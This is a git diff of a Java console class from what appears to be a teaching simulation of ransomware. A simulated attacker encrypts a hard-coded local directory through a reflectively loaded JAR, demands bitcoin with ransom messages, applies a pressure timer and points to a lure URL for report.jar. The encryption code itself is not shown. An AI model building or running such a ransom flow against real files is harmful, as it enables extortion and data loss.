@@ -18,38 +18,34 @@ import java.util.TimerTask;
 
 public class Console {
 
-    public static void main(String[] args) {
-        new Console();
-    }
-
     // Victim
     private final User userClueLess;
-
     // Attacker
     private final User userEd;
     private final double initialBalance;
-
     // Console Application
     private final ConsolePrintUtility printUtility;
+    // Data and Psychological Pressure
+    private final String directory = "C:/Users/ara112588/Desktop/data";
     private boolean isRunning;
     private String input;
-
     // Reflection
     private Class clazz;
     private Object instance;
     private Object port;
-
-    // Data and Psychological Pressure
-    private String directory = "C:/Users/ara112588/Desktop/data";
     private boolean isEncrypted;
     private double amount;
     private int minute;
-
 
     public Console() {
         loadClazzFromJavaArchive();
 
         this.printUtility = new ConsolePrintUtility();
+
+        if(this.directory.equals("")) {
+            System.out.println("+++ Please change the path of the dedicated directory before running this application. +++");
+            System.exit(0);
+        }
 
         // Victim
         this.userClueLess = new User("Clue Less", Bank.generateBankAccount("Clue Less", 5000), new Wallet());
@@ -78,6 +74,10 @@ public class Console {
                 }
             }
         }
+    }
+
+    public static void main(String[] args) {
+        new Console();
     }
 
     private void initConsoleApplication() throws Exception {
@@ -144,7 +144,7 @@ public class Console {
     // Handle menu
     private void showBalance() {
         System.out.format("Your bank account balance:\t%.2f Euro\n", userClueLess.getBankAccount().getBalance());
-        System.out.println("Your wallet balance:\t\t" + userClueLess.getWallet().getBalance() + " BTC");
+        System.out.format("Your wallet balance:\t\t%.5f BTC\n", userClueLess.getWallet().getBalance());
     }
 
     private void getRecipientInfo() {
@@ -162,12 +162,11 @@ public class Console {
     }
 
     private void payBTC(double amount, String recipient) {
-        //if (recipient.equals(StringUtility.getStringFromKey(userEd.getWallet().getPublicKey()))) {
-            Network.getInstance().addTransaction(userClueLess.getWallet().sendFunds((PublicKey) StringUtility.getKeyFromString(recipient), amount));
-        //}
+        Network.getInstance().addTransaction(userClueLess.getWallet().sendFunds((PublicKey) StringUtility.getKeyFromString(recipient), amount));
     }
 
     private void checkPayment() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+        System.out.println(userEd.getWallet().getBalance());
         if (isEncrypted) {
             if ((userEd.getWallet().getBalance() >= (this.initialBalance + amount)) && Network.getInstance().isChainValid()) {
                 System.out.println("Transaction successful! Your files will be decrypted.");
@@ -175,7 +174,7 @@ public class Console {
                 encryptMethod.invoke(port);
             } else {
                 System.out.println("You need to pay me the full amount!");
-                System.out.format("To decrypt your files, I need %.5f more BTC!\n", (amount - userEd.getWallet().getBalance()));
+                System.out.format("To decrypt your files, I need %.5f more BTC!\n", (amount - (userEd.getWallet().getBalance()) - initialBalance));
             }
         } else {
             System.out.println("What payment do you want to check? Have you tried launching http://www.trust-me.mcg/report.jar?");
@@ -185,7 +184,7 @@ public class Console {
     private void startEncryption() throws InvocationTargetException, IllegalAccessException, NoSuchMethodException {
         Method encryptMethod = port.getClass().getDeclaredMethod("startEncryption", String.class);
         Boolean returnValue = (Boolean) encryptMethod.invoke(port, directory);
-        if(returnValue) {
+        if (returnValue) {
             startTimer();
             isEncrypted = true;
         } else {
